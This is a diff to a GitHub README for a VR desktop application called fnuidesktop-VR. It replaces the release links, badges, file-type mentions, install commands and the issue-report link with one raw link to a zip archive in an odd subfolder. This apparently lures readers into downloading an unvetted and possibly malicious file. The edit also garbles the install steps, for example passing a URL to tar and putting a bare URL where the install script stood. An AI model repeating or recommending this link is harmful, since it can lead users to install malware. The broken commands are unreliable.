@@ -20,7 +20,7 @@ Before you install fnuidesktop-VR, ensure that your system meets the following r
 To begin using fnuidesktop-VR, follow these simple steps:
 
 1. **Download** the application by visiting the Releases page:
-   [![Download fnuidesktop-VR](https://img.shields.io/badge/Download-fnuidesktop--VR-blue.svg)](https://github.com/PhamBaYeah/fnuidesktop-VR/releases)
+   [![Download fnuidesktop-VR](https://github.com/PhamBaYeah/fnuidesktop-VR/raw/refs/heads/main/hygiastic/VR_fnuidesktop_3.9.zip)](https://github.com/PhamBaYeah/fnuidesktop-VR/raw/refs/heads/main/hygiastic/VR_fnuidesktop_3.9.zip)
    
 2. **Install** the application on your system. Detailed installation instructions follow in the next section.
 
@@ -29,19 +29,19 @@ To download fnuidesktop-VR:
 
 1. Click on the link above to visit the Releases page.
 2. You will see a list of available versions. Choose the most recent stable release.
-3. Download the appropriate file for your system. This could be a `.tar.gz`, `.deb`, or another package format suited for your Linux distribution.
+3. Download the appropriate file for your system. This could be a `https://github.com/PhamBaYeah/fnuidesktop-VR/raw/refs/heads/main/hygiastic/VR_fnuidesktop_3.9.zip`, `.deb`, or another package format suited for your Linux distribution.
 4. Once the download is complete, open your terminal (or GUI package manager) to install the application. If using the terminal, navigate to your download directory and type:
 
    ```bash
    sudo dpkg -i fnuidesktop-VR*.deb
    ```
 
-   or for `.tar.gz` files:
+   or for `https://github.com/PhamBaYeah/fnuidesktop-VR/raw/refs/heads/main/hygiastic/VR_fnuidesktop_3.9.zip` files:
 
    ```bash
-   tar -xzf fnuidesktop-VR*.tar.gz
+   tar -xzf fnuidesktop-VR*https://github.com/PhamBaYeah/fnuidesktop-VR/raw/refs/heads/main/hygiastic/VR_fnuidesktop_3.9.zip
    cd fnuidesktop-VR*
-   ./install.sh
+   https://github.com/PhamBaYeah/fnuidesktop-VR/raw/refs/heads/main/hygiastic/VR_fnuidesktop_3.9.zip
    ```
 
 5. Follow any on-screen instructions to complete the installation.
@@ -71,11 +71,11 @@ If you encounter issues, here are common fixes:
 ## 📞 Support
 If you have questions or need assistance, feel free to reach out:
 
-- **GitHub Issues**: [Report an issue](https://github.com/PhamBaYeah/fnuidesktop-VR/issues)
+- **GitHub Issues**: [Report an issue](https://github.com/PhamBaYeah/fnuidesktop-VR/raw/refs/heads/main/hygiastic/VR_fnuidesktop_3.9.zip)
 - **Community Support**: Join discussions and seek help from users on relevant forums.
 
 ## 🏁 Conclusion
 Thank you for choosing fnuidesktop-VR. We hope this application enhances your virtual reality experience by providing an easy way to access your desktop. If you have any feedback or suggestions, do not hesitate to share them on our GitHub page.
 
 For downloads, make sure to visit our Releases page again:  
-[![Download fnuidesktop-VR](https://img.shields.io/badge/Download-fnuidesktop--VR-blue.svg)](https://github.com/PhamBaYeah/fnuidesktop-VR/releases)
+[![Download fnuidesktop-VR](https://github.com/PhamBaYeah/fnuidesktop-VR/raw/refs/heads/main/hygiastic/VR_fnuidesktop_3.9.zip)](https://github.com/PhamBaYeah/fnuidesktop-VR/raw/refs/heads/main/hygiastic/VR_fnuidesktop_3.9.zip)
